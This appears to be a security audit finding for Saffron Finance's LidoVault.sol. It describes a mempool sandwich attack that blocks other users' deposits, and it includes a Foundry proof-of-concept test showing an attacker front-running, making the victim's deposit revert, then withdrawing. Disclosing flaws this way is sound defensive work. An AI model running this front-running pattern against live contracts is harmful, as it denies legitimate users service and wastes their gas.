### M-1 Sandwich Attack Vulnerability and Comment-Code Discrepancy in LidoVault.sol:deposit Mechanism Leads to Protocol Malfunction and Poor User Experience

## Summary

An attacker can execute a sandwich attack to prevent legitimate users from depositing on both sides of the vault. This attack can cause protocol malfunction and lead to a poor user experience by manipulating the remaining capacity to be less than the minimum deposit amount, only allowing users to deposit the minimumDepositAmount to prevent reverts.
Additionally, there is a discrepancy between a code comment stating "no refunds allowed" and the actual implementation of the withdraw function, which does allow withdrawals (refunds) before the vault starts.
https://github.com/sherlock-audit/2024-08-saffron-finance/blob/38dd9c8436db341c331f1b14545770c1766fc0ee/lido-fiv/contracts/LidoVault.sol#L368

```solidity
// no refunds allowed
require(amount <= variableSideCapacity - variableBearerTokenTotalSupply, "OED");
```

## Root cause

The vulnerability stems from the check remainingCapacity >= minimumDepositAmount in the deposit function, which can be exploited by an attacker to force all user transactions above minimumDepositAmount to revert, leading to protocol malfunction and a poor user experience

## Internal pre conditions

The vault has not started (!isStarted() is true).

## External pre conditions

The attacker can monitor the mempool and front-run transactions.
The attacker has sufficient ETH to perform the attack.

## Impact

Legitimate users are unable to deposit to the variable side as intended.
The protocol malfunctions, not operating as designed.
Poor user experience due to failed transactions and inability to participate as expected.
Increased gas costs for users due to failed transactions.

## POC

The proof of concept is written for the variable side, as withdrawals in that part of the vault are instant and do not require a withdrawal request from Lido.

```solidity
 function testDdosSandwichAttack() public {
        // vault has been initialized with 100eth fixed part and 50 eth varaible part
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        uint256 minimumDepositAmount = 0.01 ether; // Minimum deposit is 0.01 ETH

        // Victim attempts to deposit
        uint256 victimDeposit = 0.02 ether;
        vm.deal(victim, victimDeposit);

        // Front-run: Attacker deposits just enough to leave less than minimum deposit amount
        uint256 attackerDeposit = VARIABLE_CAPACITY - victimDeposit + 1 wei;
        vm.deal(attacker, attackerDeposit);
        vm.prank(attacker);
        lidoVault.deposit{value: attackerDeposit}(1); // Variable side

        // Victim's transaction should now revert
        vm.prank(victim);
        vm.expectRevert(bytes("OED")); // Remaining Capacity error
        lidoVault.deposit{value: victimDeposit}(1);

        // Attacker withdraws their variable part
        vm.prank(attacker);
        lidoVault.withdraw(1); // 1 for VARIABLE side

        // Assert that the attacker has successfully withdrawn
        assertEq(lidoVault.variableBearerToken(attacker), 0);
        assertEq(address(attacker).balance, attackerDeposit);

        // Assert that the vault has not started and victim couldn't deposit
        assertEq(lidoVault.isStarted(), false);
        assertEq(lidoVault.variableBearerToken(victim), 0);
    }
```

## Mitigation

Remove or update the "no refunds allowed" comment to accurately reflect the contract's behavior.
If refunds are not intended, modify the withdraw function to disallow withdrawals before the vault starts.
If refunds are intended, add a time lock to prevent user withdrawals with the behavior explained above.
